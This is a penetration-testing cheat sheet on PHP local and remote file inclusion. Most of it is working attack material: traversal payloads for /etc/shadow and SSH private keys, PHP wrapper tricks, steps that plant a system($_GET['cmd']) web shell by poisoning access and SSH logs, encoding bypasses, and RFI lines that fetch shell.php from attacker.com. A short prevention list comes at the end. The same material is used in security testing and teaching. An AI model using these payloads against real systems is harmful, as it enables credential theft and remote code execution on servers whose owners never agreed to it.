# File Inclusion (LFI / RFI)

## What is File Inclusion?

File inclusion vulnerabilities occur when a web application dynamically includes files based on user-supplied input without proper validation. This can allow attackers to read sensitive files (LFI) or execute remote code (RFI/LFI-to-RCE).

---

## Types

### Local File Inclusion (LFI)
Includes files that already exist on the server.
```
http://target.com/page?file=../../../../etc/passwd
```

### Remote File Inclusion (RFI)
Includes a file from an external URL. Requires `allow_url_include = On` in PHP (rare in modern setups).
```
http://target.com/page?file=http://attacker.com/shell.php
```

---

## Common Parameters to Test

```
?file=
?page=
?include=
?path=
?template=
?view=
?doc=
?lang=
```

---

## LFI Payloads

### Basic
```
../../../../etc/passwd
../../../../etc/shadow
../../../../etc/hosts
../../../../proc/self/environ
../../../../var/log/apache2/access.log
```

### Windows
```
../../../../windows/win.ini
../../../../windows/system32/drivers/etc/hosts
../../../../boot.ini
```

### PHP Wrappers
```bash
# Base64 encode and read PHP source
php://filter/convert.base64-encode/resource=index.php

# Execute PHP code
php://input   (POST body: <?php system($_GET['cmd']); ?>)

# Read file
php://filter/resource=/etc/passwd
```

### Null Byte (PHP < 5.3.4)
```
../../../../etc/passwd%00
../../../../etc/passwd%00.jpg
```

### Path Truncation (bypass extension appending)
```
../../../../etc/passwd.....................................
../../../../etc/passwd/./././././././././././././././././.
```

---

## LFI to RCE

### Log Poisoning (Apache/Nginx access log)
1. Inject PHP into User-Agent header:
```
GET / HTTP/1.1
User-Agent: <?php system($_GET['cmd']); ?>
```
2. Include the log file:
```
?file=../../../../var/log/apache2/access.log&cmd=id
```

### `/proc/self/environ` Poisoning
1. Inject PHP into HTTP_USER_AGENT
2. Include: `?file=../../../../proc/self/environ&cmd=id`

### PHP Session File
1. Set malicious value in a session variable
2. Include: `?file=../../../../var/lib/php/sessions/sess_<your_session_id>`

### SSH Log Poisoning
```bash
ssh '<?php system($_GET["cmd"]); ?>'@target.com
```
Then: `?file=../../../../var/log/auth.log&cmd=id`

### PHP Pearcmd (PHP 7.3+)
Using `register_argc_argv` and pearcmd to write files.

---

## Directory Traversal Bypass Techniques

| Filter | Bypass |
|---|---|
| Strips `../` | `....//....//etc/passwd` |
| URL decode | `%2e%2e%2f%2e%2e%2fetc/passwd` |
| Double encode | `%252e%252e%252f` |
| Null byte (old PHP) | `../../../etc/passwd%00` |
| Absolute path allowed | `/etc/passwd` |

---

## Interesting Files to Read

### Linux
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/crontab
/proc/self/environ
/proc/self/cmdline
/proc/self/status
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/auth.log
/home/<user>/.ssh/id_rsa
/home/<user>/.bash_history
/root/.ssh/id_rsa
```

### PHP Config / Source
```
/etc/php.ini
/etc/php/7.4/apache2/php.ini
index.php (via php://filter wrapper)
config.php
```

### Windows
```
C:\Windows\System32\drivers\etc\hosts
C:\Windows\win.ini
C:\inetpub\logs\LogFiles\
C:\xampp\apache\logs\access.log
```

---

## RFI Exploitation

If `allow_url_include` is enabled:
```
?file=http://attacker.com/shell.php
?file=\\attacker.com\share\shell.php   # Windows UNC path
```

Host a malicious PHP file on your server and include it.

---

## Prevention

- Never use user input directly in file include functions
- **Allowlist** valid file names/paths
- Disable `allow_url_include` and `allow_url_fopen`
- Use `realpath()` and verify the resolved path starts with the expected base directory
- Run application with minimal filesystem permissions

---

## References

- [PortSwigger Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [PayloadsAllTheThings - File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HackTricks LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)
